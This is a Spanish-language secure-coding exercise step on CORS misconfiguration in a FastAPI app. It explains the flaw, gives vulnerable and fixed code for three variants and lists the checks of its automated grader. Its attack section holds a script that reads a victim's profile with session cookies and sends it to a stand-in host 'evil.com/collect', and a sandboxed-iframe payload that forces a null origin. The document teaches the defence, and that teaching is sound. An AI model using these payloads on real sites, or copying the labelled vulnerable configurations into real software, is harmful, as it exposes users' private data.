# Paso 5 — CORS Misconfiguration
**Tecnologia:** Python / FastAPI | **OWASP:** A05:2021 - Security Misconfiguration | **CWE-942**

---

## Que es esta vulnerabilidad?

Cross-Origin Resource Sharing (CORS) es el mecanismo por el que un servidor declara que origenes externos pueden leer sus respuestas desde un navegador. Una mala configuracion CORS no afecta a peticiones directas con curl o Postman; solo importa en el contexto del navegador, donde la politica Same-Origin normalmente bloquearia las peticiones cross-origin.

La combinacion `allow_origins=["*"]` con `allow_credentials=True` es la configuracion mas peligrosa: indica al navegador que cualquier dominio puede hacer peticiones autenticadas (con cookies de sesion) y leer las respuestas. Un sitio malicioso puede aprovechar esto para extraer datos privados del usuario mientras este navega.

La especificacion CORS prohibe esta combinacion y los navegadores modernos la rechazan generando un error. Sin embargo, muchos desarrolladores "resuelven" el error reflejando el origen de la peticion sin validarlo, lo que es igualmente peligroso y mucho mas dificil de detectar.

---

## Donde ocurre en este codigo?

**Archivo:** `src/python/routes/cors.py`

```python
# CODIGO VULNERABLE — estado actual del ejercicio
def configure_cors(app: FastAPI) -> None:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],     # cualquier origen puede hacer peticiones
        allow_credentials=True,  # con cookies de sesion incluidas
        allow_methods=["*"],
        allow_headers=["*"],
    )
```

Con esta configuracion, cuando `evil.com` hace una peticion a la API con credenciales, el servidor responde con `Access-Control-Allow-Origin: *` y `Access-Control-Allow-Credentials: true`. El navegador permite que el script de `evil.com` lea la respuesta completa, incluyendo datos privados del usuario autenticado.

---

## Como lo explotaria un atacante

**Escenario:** la victima esta autenticada en `api.empresa.com`. Un atacante la atrae a `evil.com`:

```html
<!-- Codigo en evil.com que roba datos de la API -->
<script>
fetch('https://api.empresa.com/api/user/profile', {
    credentials: 'include'  // incluye las cookies de sesion de la victima
})
.then(r => r.json())
.then(data => {
    // el atacante recibe nombre, email, datos de pago de la victima
    fetch('https://evil.com/collect?d=' + btoa(JSON.stringify(data)));
});
</script>
```

Con la configuracion vulnerable, el servidor responde con los datos y el navegador permite que `evil.com` los lea. El atacante recibe los datos privados sin que la victima lo note.

---

## Tu tarea: aplicar la mitigacion

Modifica `src/python/routes/cors.py` para usar una lista explicita de origenes cargada desde variables de entorno:

```python
# CODIGO SEGURO
import os
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware

ALLOWED_ORIGINS = [
    origin.strip()
    for origin in os.environ.get("CORS_ALLOWED_ORIGINS", "https://app.empresa.com").split(",")
    if origin.strip()
]

def configure_cors(app: FastAPI) -> None:
    app.add_middleware(
        CORSMiddleware,
        allow_origins=ALLOWED_ORIGINS,             # lista explicita, no wildcard
        allow_credentials=True,
        allow_methods=["GET", "POST", "PUT", "DELETE"],
        allow_headers=["Authorization", "Content-Type"],
    )
```

### Por que funciona esta mitigacion?

- **Lista explicita de origenes:** el middleware verifica que el encabezado `Origin` de la peticion coincide con uno de los origenes permitidos. Si `evil.com` no esta en la lista, el servidor no incluye `Access-Control-Allow-Origin` y el navegador bloquea la lectura de la respuesta.
- **Variables de entorno:** los origenes permitidos cambian entre entornos. Cargarlos desde entorno evita hardcodear URLs y permite gestion correcta en CI/CD.
- **`allow_methods` y `allow_headers` explicitos:** en lugar de `["*"]`, reduce la superficie especificando exactamente que metodos y headers son necesarios para la aplicacion.

---

## Variantes de la misma categoria (Security Misconfiguration — mas complejas)

### Variante A: Origin Reflection sin validacion (wildcard dinamico)

Una solucion incorrecta al error de `*` + `credentials` es reflejar automaticamente el origen de la peticion:

```python
# VULNERABLE — refleja el Origin sin validar (equivale a allow_origins=["*"])
@app.middleware("http")
async def cors_middleware(request: Request, call_next):
    response = await call_next(request)
    origin = request.headers.get("Origin", "")
    # reflejo sin validar: cualquier origen recibira su nombre como permitido
    response.headers["Access-Control-Allow-Origin"] = origin
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

Este patron es funcionalmente equivalente a `allow_origins=["*"]` + `credentials=True` pero pasa desapercibido en revisiones de codigo.

```python
# SEGURO — reflejar solo si el origen esta en la allowlist
ALLOWED_ORIGINS = set(os.environ.get("CORS_ALLOWED_ORIGINS", "").split(","))

@app.middleware("http")
async def cors_middleware(request: Request, call_next):
    response = await call_next(request)
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

---

### Variante B: Validacion CORS por sufijo — bypass por subdominio

```python
# VULNERABLE — validacion por sufijo permite bypass
def is_allowed_origin(origin: str) -> bool:
    return origin.endswith(".empresa.com")  # solo comprueba sufijo
```

Bypass: el atacante registra `evil.empresa.com` (si el DNS lo permite) o `evilempresa.com` que tambien termina en `empresa.com` si no se ancla el punto. Tambien `https://evil.com?x=.empresa.com` puede pasar si la validacion no es rigurosa.

```python
# SEGURO — comparacion exacta contra allowlist normalizada
ALLOWED_ORIGINS = {
    "https://app.empresa.com",
    "https://admin.empresa.com",
}

def is_allowed_origin(origin: str) -> bool:
    return origin in ALLOWED_ORIGINS  # comparacion exacta de string completo
```

---

### Variante C: CORS con origen `null` (iframes sandboxed)

```python
# VULNERABLE — aceptar null como origen valido
ALLOWED_ORIGINS = ["https://app.empresa.com", "null"]
```

El origen `null` lo envian los navegadores cuando la peticion viene de un archivo local (`file://`), un iframe sandboxed (`<iframe sandbox>`) o ciertos redirects. Un atacante puede forzar `Origin: null` usando:

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://api.empresa.com/data',{credentials:'include'}).then(r=>r.json()).then(d=>parent.postMessage(d,'*'))</script>">
</iframe>
```

```python
# SEGURO — nunca incluir null en la allowlist
ALLOWED_ORIGINS = ["https://app.empresa.com"]
# null no es un origen legitimo para APIs web
```

---

## Referencias

- [OWASP A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
- [PortSwigger - CORS misconfiguration](https://portswigger.net/web-security/cors)
- [Mozilla MDN - CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)

---

## Lo que valida el workflow automaticamente

El workflow **Validate Step 05** exige que `src/python/routes/cors.py` contenga:
- `ALLOWED_ORIGINS`
- `os.environ.get`
- La ausencia de `allow_origins=["*"]`